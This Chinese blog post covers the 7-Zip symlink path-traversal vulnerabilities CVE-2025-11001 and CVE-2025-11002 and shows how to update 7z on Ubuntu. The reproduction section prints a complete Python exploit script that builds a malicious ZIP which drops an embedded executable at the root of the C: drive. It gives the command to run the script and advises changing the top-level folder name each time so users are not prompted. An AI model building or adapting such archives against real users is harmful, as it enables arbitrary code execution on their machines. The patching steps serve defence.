---
title: "7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本"
source: https://mrxn.net/jswz/7zip-rce.html
---

# 7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/17 12:06
* 2472浏览
* [0评论](#comment)
* 47分钟
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 前言

最近7-Zip 爆出了两个漏洞（CVE-2025-11001 和 CVE-2025-11002），允许通过恶意 ZIP 文件执行代码。主要是通过在7z压缩包在其中包含恶意符号链接和越级路径，一旦用户（或系统）使用存在漏洞的 7‑Zip 版本打开/解压该压缩包，7‑Zip 在处理符号链接时会突破预定的解压目录，
**将文件写入到目标目录之外的任意位置**
。例如，可以覆盖系统的配置文件或自动运行脚本，然后在后续执行中触发恶意代码加载。归根结底，这属于
**目录遍历（Path Traversal）**
漏洞：恶意数据使解压过程脱离受限目录，把恶意文件植入到敏感路径下。

如果攻击者合理设计后续payload（例如在系统启动项或计划任务中放置可执行文件），则可以在当前用户或服务账户权限下
**执行任意代码**
。攻击链通常需要用户交互——诱使用户打开或解压恶意 ZIP 文件。一旦解压，恶意负载就会被写入系统目录并被执行；典型后果包括系统被完全控制、敏感数据泄露，甚至部署勒索软件等后续攻击。

CVE-2025-11001 和 CVE-2025-11002 均是符号链接处理漏洞，允许恶意 ZIP 文件进行越级解压并最终导致 RCE（远程代码执行），因此更新系统7zip至最新安全版本就很有必要了，本文就简单记录下Linux系统（Ubuntu举例，Windows直接官网下载exe安装即可）更新7z至最新安全版本的步骤。

# 漏洞复现

> 在Windows上使用7zip 24.09版本复现下

使用如下Python脚本，生成一个带有软链接符合的恶意压缩包

```
import argparse
import os
import time
import zipfile

def add_dir(z, arcname):
    if not arcname.endswith('/'):
        arcname += '/'
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o040755 << 16) | 0x10
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, b'')

def add_symlink(z, arcname, target):
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o120777 << 16)
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, target.encode('utf-8'))

def add_file_from_disk(z, arcname, src_path):
    with open(src_path, 'rb') as f:
        payload = f.read()
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o100644 << 16)
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, payload)

def main():
    parser = argparse.ArgumentParser(
        description="Crafts a zip that exploits CVE-2025-11001."
    )
    parser.add_argument(
        "--zip-out", "-o",
        required=True,
        help="Path to the output ZIP file."
    )
    parser.add_argument(
        "--symlink-target", "-t",
        required=True,
        help="Destination path the symlink points to - specify a \"C:\" path"
    )
    parser.add_argument(
        "--data-file", "-f",
        required=True,
        help="Path to the local file to embed e.g an executable or bat script."
    )
    parser.add_argument(
        "--dir-name",
        default="data",
        help="Top-level directory name inside the ZIP (default: data)."
    )
    parser.add_argument(
        "--link-name",
        default="link_in",
        help="Symlink entry name under the top directory (default: link_in)."
    )
    args = parser.parse_args()

    top_dir = args.dir_name.rstrip("/")
    link_entry = f"{top_dir}/{args.link_name}"
    embedded_name = os.path.basename(args.data_file)
    file_entry = f"{link_entry}/{embedded_name}"

    with zipfile.ZipFile(args.zip_out, "w") as z:
        add_dir(z, top_dir)
        add_symlink(z, link_entry, args.symlink_target)
        add_file_from_disk(z, file_entry, args.data_file)

    print(f"Wrote {args.zip_out}")

if __name__ == "__main__":
    main()
```

执行
`python3 exploit.py -t "C:" -f pwn.exe -o exp.zip`
生成一个恶意的
`exp.zip`
文件，然后使用
`7z.exe x exp.zip`
进行解压，即可触发漏洞，将我们的恶意文件
`pwn.exe`
写如C盘根目录，如下图所示

![7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://image.mrxn.net/d28306f3b71c40a7820dde54031de579.webp)

因此，就可将任意恶意内容制作成压缩包，诱导用户使用7zip进行解压，不过需要注意，如果压缩包顶层目录已经存在会提示用户是否覆盖

![7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://image.mrxn.net/bf9597c2cf0a4cc9b995bcbda08e1bf1.webp)

所以最好修改下脚本，每次压缩包的顶层文件夹不重复。

当然，使用GUI界面解压一样会触发漏洞

![7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://image.mrxn.net/125f72d418f148d7be28024e84afb387.webp)

Windows更新到最新版好再次测试，就会报错，提示危险软链接被忽略了

![7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://image.mrxn.net/ea19d4f443d6445eac72f838eddde8ba.webp)

# 更新

## 下载源码

这里以最新版 2501 版本为例，详细的版本可以在官网查看
`https://www.7-zip.org/`

![7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://image.mrxn.net/2f110db639174a3a94aa3ec41570d07f.webp)

然后在
`https://sourceforge.net/projects/sevenzip/files/7-Zip/`
获取最新版本

![7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://image.mrxn.net/d248e568408a4eaba894a15cc2ba5b82.webp)

目前最新是2501版本
`https://sourceforge.net/p/sevenzip/discussion/45797/thread/da14cd780b/`
获取对应版本的压缩包

![7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://image.mrxn.net/330cfef067b747f0bd85c60cb06405e0.webp)

找到适用于Linux的
`7z2501-linux-x64.tar.xz`
（注意自己的系统架构是amd还是arm）

## 复制安装

先查看你的原始7z压缩软件在那个位置，一般Ubuntu默认在
`/usr/bin/7z`
和
`/usr/local/bin/7z`
，属于在Ubuntu里常用的
**归档管理器**
软件应用的依赖。

查看下当前版本

```
7z -version 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02
```

版本比较低且仓库默认版本可能不是最新版本，可以先执行以下命令更新尝试

```
sudo apt update
sudo apt install p7zip-full
```

下载包含软件二进制的压缩包后，解压

```
# 下载7z压缩包
mkdir 7zupdate && cd 7zupdate && wget https://7-zip.org/a/7z2501-linux-x64.tar.xz
sudo mv /usr/local/bin/7z /usr/local/bin/7z.bak   # 备份旧版
sudo mv /usr/bin/7z /usr/bin/7z.bak               # 备份旧版
tar -xvf 7z2501-linux-x64.tar.xz                  #解压
sudo cp ./7zz /usr/local/bin/7z                   # 拷贝新版
sudo cp ./7zz /usr/bin/7z                   # 拷贝新版
sudo chmod +x /usr/local/bin/7z
#再次执行 7z -h 或者 7z -version 查看版本，验证更新情况
7z -h

7-Zip (z) 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
```

确定
**归档管理器**
软件应用的依赖7z是否为我们更新的

**归档管理器（Archive Manager）**
，命令行名：
`file-roller`
使用如下命令来查看调用链

```
strace -f -e execve file-roller yourfile.7z 2>&1 | grep 7z
```

![7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://image.mrxn.net/17617e8355c249b68ee7b6e108d16c5b.webp)

可以看到调用的是我们更新后的7z压缩软件，至此更新成功。

当然你可以下载7z的源码进行编译安装。

# 参考

* `https://github.com/pacbypass/CVE-2025-11001`

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[7-Zip CVE-2025-11001 和 CVE-2025-11002 复现+更新Linux上7z至最新版本](https://mrxn.net/jswz/7zip-rce.html)
  
文章链接：
<https://mrxn.net/jswz/7zip-rce.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/7zip-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/7zip-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});